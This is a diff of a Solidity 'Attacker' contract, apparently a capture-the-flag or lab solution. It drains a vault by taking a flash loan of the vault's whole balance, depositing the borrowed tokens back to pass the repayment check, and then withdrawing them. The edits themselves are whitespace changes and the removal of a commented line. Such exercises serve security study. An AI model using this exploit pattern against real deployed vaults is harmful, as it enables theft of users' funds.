@@ -2,8 +2,8 @@
 pragma solidity 0.8.20;
 
 import "./vault.sol";
-
 import "./token.sol";
+
 
 contract Attacker {
     Vault vault;
@@ -17,9 +17,7 @@ contract Attacker {
     function attack() public  {
 
         uint256 value = token.balanceOf(address(vault));
-        
         vault.flashLoan(value);
-    
         vault.withdraw(vault.balanceOf(address(this)));
     }
 
@@ -28,6 +26,5 @@ contract Attacker {
         require(caller == address(vault));
         token.approve(address(vault), amount);
         vault.deposit(amount);
-        // token.transfer(caller, amount);
     }
 }
